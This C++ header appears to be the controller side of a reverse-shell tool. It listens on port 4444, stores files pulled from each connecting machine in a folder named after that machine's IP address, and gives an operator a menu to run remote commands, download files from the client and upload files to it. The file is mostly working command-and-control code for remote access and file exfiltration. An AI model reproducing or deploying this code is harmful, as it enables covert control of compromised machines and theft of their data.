#ifndef _SERVER_H_
#define _SERVER_H_

#include <fstream>
#include <boost/asio.hpp>
#include <memory>
#include <filesystem>
#include <iostream>
#include <stdlib.h>
#include "../CommonReverseShell/Functions.hpp"

// TODO - take this function to "common utils"
std::string EnvVariable(const std::string& envVariable)
{
    char* buf = nullptr;
    size_t sz = 0;
    return (_dupenv_s(&buf, &sz, envVariable.c_str()) == 0 && buf != nullptr) ? std::string(buf) : "Error";
}


class Session : public std::enable_shared_from_this<Session>
{
private:
    using TcpSocket = boost::asio::ip::tcp::socket;

public:
    Session(TcpSocket socket)
        : m_socket(std::move(socket)), m_ShellUtils(this)
    {
        ClientDedicatedDirectory();
        m_ShellUtils.Start();
    }

private:
    void ClientDedicatedDirectory()
    {
        SetClientDedicatedDirectory();
        CreateClientDedicatedDirectory();
        std::filesystem::current_path(m_clientDedicatedDirectory);
    }

    void SetClientDedicatedDirectory()
    {
        std::string userHomeDirectory(EnvVariable("USERPROFILE"));
        std::string clientIp(m_socket.remote_endpoint().address().to_string());
        std::cout << "Connected to: " << clientIp << std::endl;
        m_clientDedicatedDirectory = (std::filesystem::path(userHomeDirectory) / "Downloads" / "Dst" / clientIp).string();
    }

    void CreateClientDedicatedDirectory()
    {
        std::filesystem::create_directory(m_clientDedicatedDirectory);
        std::cout << "Created directory: " << m_clientDedicatedDirectory << std::endl;
    }

    SharedReverseShellUtils<Session>::OperationType ReadOperationType()
    {
        PrintOptionsMenu();
        std::string operation;
        std::getline(std::cin >> std::ws, operation);

        return m_ShellUtils.GetOperationType(operation);
    }

    void PrintOptionsMenu()
    {
        std::cout << "\n\n============  Choose an operation ============\n"
            << "1) Run command\n"
            << "2) Download file\n"
            << "3) Upload file\n"
            << "[+] Your choise - ";
    }

    void Command()
    {
        auto command = ReadOperationInstruction("Write command");
        m_ShellUtils.Send("1");
        m_ShellUtils.Send(command);
        auto commandOutput = m_ShellUtils.Response();
        std::cout << std::endl << commandOutput << std::endl;
    }

    std::string ReadOperationInstruction(const std::string& operation)
    {
        std::cout << "\n\n[+]" << operation << ": ";
        std::string instruction;
        std::getline(std::cin >> std::ws, instruction);
        RemoveUnnecessaryQuotationMark(instruction);
        return instruction;
    }

    void RemoveUnnecessaryQuotationMark(std::string& string)
    {
        if(string.front() == '\"' && string.back() == '\"')
            string = string.substr(1, string.length() - 2);
    }

    void Download()
    {
        auto filePath = ReadOperationInstruction("Source path (remote)");
        m_ShellUtils.Send("2");
        m_ShellUtils.Send(filePath);

        if (m_ShellUtils.Response() == "0")
        {
            std::cout << "Client doesn't have the file:  " << filePath << std::endl;
            return;
        }

        auto fileToCreate = CreateFileLocally(filePath);
        m_ShellUtils.Download(filePath);
        std::cout << "File downloaded to - " << fileToCreate << std::endl;
    }

    void Upload()
    {
        auto localFilePath = ReadOperationInstruction("Source path (local)");
        if (!IsRegularFileExists(localFilePath))
        {
            std::cout << localFilePath << " file doesn't exist locally" << std::endl;
            return;
        }

        auto destinationFilePath = ReadOperationInstruction("Destination path (remote)");
        m_ShellUtils.Send("3");
        m_ShellUtils.Send(destinationFilePath);
        
        if (m_ShellUtils.Response() != "0")
            std::cout << destinationFilePath << " already exists on the client. It will be overwitten!" << std::endl;

        m_ShellUtils.Upload(localFilePath);
        std::cout << "File uploaded to (remote): " << destinationFilePath << std::endl;
    }

    void InvalidOperation()
    {
        std::cout << "Invalid operation! Type the number of a option from the menu!" << std::endl;
    }

    std::string CreateFileLocally(const std::string& filePath)
    {
        auto fileName = std::filesystem::path(filePath).filename().string();
        auto fileToCreate = (std::filesystem::path(m_clientDedicatedDirectory) / fileName).string();
        m_ShellUtils.OpenFileFor(fileToCreate, std::ios::out | std::ios::binary);

        return fileToCreate;
    }


    TcpSocket m_socket;
    SharedReverseShellUtils<Session> m_ShellUtils;
    std::string m_clientDedicatedDirectory; // Convert this to a map of IP-directoryPath so it could handle multiple clients

    friend class SharedReverseShellUtils<Session>;
};


class Server
{
private:
    using TcpSocket = boost::asio::ip::tcp::socket;
    using TcpAcceptor = boost::asio::ip::tcp::acceptor;
    using IoService = boost::asio::io_service;
public:

    Server(IoService& ioService)
        : m_socket(ioService), m_acceptor(ioService, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), 4444))
    {
        std::cout << "Server started" << std::endl;

        AcceptConnection();
    }

private:

    void AcceptConnection()
    {
        m_acceptor.async_accept(m_socket, [this](boost::system::error_code ec)
            {
                if (!ec)
                std::make_shared<Session>(std::move(m_socket));

        AcceptConnection();
            });
    }

    TcpSocket m_socket;
    TcpAcceptor m_acceptor;
};

#endif _SERVER_H_